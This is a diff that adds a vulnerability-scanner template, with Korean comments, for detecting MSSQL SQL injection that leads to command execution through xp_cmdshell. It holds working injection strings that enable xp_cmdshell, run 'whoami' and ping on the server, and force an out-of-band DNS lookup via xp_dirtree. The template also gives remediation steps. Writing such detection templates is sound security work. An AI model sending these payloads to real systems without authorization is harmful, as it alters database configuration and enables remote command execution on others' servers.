@@ -1,0 +1,48 @@
+id: sqli-mssql-xp-cmdshell
+
+info:
+  name: MSSQL SQL Injection via xp_cmdshell (RCE)
+  author: security-researcher
+  severity: critical
+  description: |
+    MSSQL xp_cmdshell을 이용한 운영체제 명령 실행(RCE) 취약점을 탐지합니다.
+    SA 계정이나 sysadmin 권한이 있을 때 서버 완전 장악이 가능합니다.
+  tags: sqli,mssql,xp-cmdshell,rce,injection,critical
+  remediation: |
+    - xp_cmdshell 비활성화: sp_configure 'xp_cmdshell', 0
+    - SA 계정 비활성화 및 최소 권한 계정 사용
+    - 네트워크 방화벽으로 DB 서버 직접 접근 차단
+
+http:
+  - method: GET
+    path:
+      # xp_cmdshell 활성화 시도 탐지
+      - "{{BaseURL}}?id=1; EXEC sp_configure 'show advanced options',1--"
+      - "{{BaseURL}}?id=1; EXEC sp_configure 'xp_cmdshell',1--"
+      - "{{BaseURL}}?id=1; EXEC master..xp_cmdshell 'whoami'--"
+      - "{{BaseURL}}?id=1; EXEC xp_cmdshell 'ping -n 1 127.0.0.1'--"
+      # Time-based로 xp_cmdshell 실행 여부 확인
+      - "{{BaseURL}}?id=1; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--"
+      # DNS를 통한 OOB 확인
+      - "{{BaseURL}}?id=1; EXEC master..xp_dirtree '\\\\{{interactsh-url}}\\test'--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "xp_cmdshell"
+          - "nt authority\\\\system"
+          - "administrator"
+          - "Msg \\d+.*xp_cmdshell"
+        condition: or
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
